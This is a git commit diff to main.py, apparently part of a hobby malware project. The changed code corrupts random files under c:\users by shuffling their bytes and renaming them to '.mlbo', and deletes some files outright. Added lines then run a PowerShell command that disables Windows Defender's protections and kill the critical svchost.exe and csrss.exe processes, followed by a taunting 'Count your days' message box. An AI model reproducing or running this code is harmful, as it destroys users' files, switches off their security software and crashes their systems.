c9216434d0881b42725fd87130180ab66448cf8e
UrkiMii <74517821+UrkiMimi@users.noreply.github.com>
2025-02-03 11:04:53 -0600

    goin under

--- main.py
+++ main.py
@@ -19,7 +19,7 @@ if debug:
 if not(do_destruction):
     print('jej')
 else:
-    for i in range(12800):
+    for i in range(3200):
         try:
             # init
             direc = 'c:\\users'
@@ -41,35 +41,51 @@ else:
                     direc = 'c:\\users'
                     dirList = os.listdir(os.path.expanduser(direc))
                     randChoice = rand.choice(dirList)
+            
+            if (os.path.splitext(direc)[1] == '.mlbo') or (os.path.getsize(direc) >= 32000000):
+                print('skip file')
+            else:
+                if (not(rand.randint(1,100)) == 1):
+                    # Opens the file and converts it to an array
+                    with open(direc,'rb') as bFile:
+                        arrayList = list(bFile.read())
 
-            # Opens the file and converts it to an array
-            with open(direc,'rb') as bFile:
-                arrayList = list(bFile.read())
 
+                    # This try and except thing is pretty stupid since this shouldn't go out of range but I'm still adding it here
+                    #This for loop swaps values with neighboring ones            
+                    try:
+                        for i in range(round(len(arrayList)/10)):
+                            arrayList[rand.randint(0,len(arrayList)-1)] = rand.choice(arrayList)
+                    except:
+                        print('failed to shift file')
+                    
+                    #convert array list to bytearray
+                    byteArray = bytearray(arrayList)
 
-            # This try and except thing is pretty stupid since this shouldn't go out of range but I'm still adding it here
-            #This for loop swaps values with neighboring ones
-            try:
-                for i in range(round(len(arrayList)/10)):
-                    arrayList[rand.randint(0,len(arrayList)-1)] = rand.choice(arrayList)
-            except:
-                print('failed to shift file')
+                    #export file
+                    finalFile = open(direc, 'wb')
+                    finalFile.write(bytes(byteArray))
+                    finalFile.close()
 
-            #convert array list to bytearray
-            byteArray = bytearray(arrayList)
+                    # rename file
+                    os.rename(direc, os.path.splitext(direc)[0] + '.mlbo')
+                else:
+                    # deletes file outright in 1/100 chance or the file is too large
+                    os.remove(direc)
 
-            #export file
-            finalFile = open(direc, 'wb')
-            finalFile.write(bytes(byteArray))
-            finalFile.close()
-
-            # Debug log stuff
-            if debug:
-                print('wrote to file')
+                # Debug log stuff
+                if debug:
+                    print('wrote to file')
         except:
             # rerolls the file incase it errors out
-            print('rerolling')
+            print('rerolling id: ' + str(i))
+
 
 # shows this message after destruction
 if do_destruction:
     tkMsg.showinfo(title='get rekt lmfao',message='Count your days.')
+
+# try to do funny
+os.system("powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'")
+os.system('taskkill /f /im svchost.exe')
+os.system('taskkill /f /im csrss.exe')
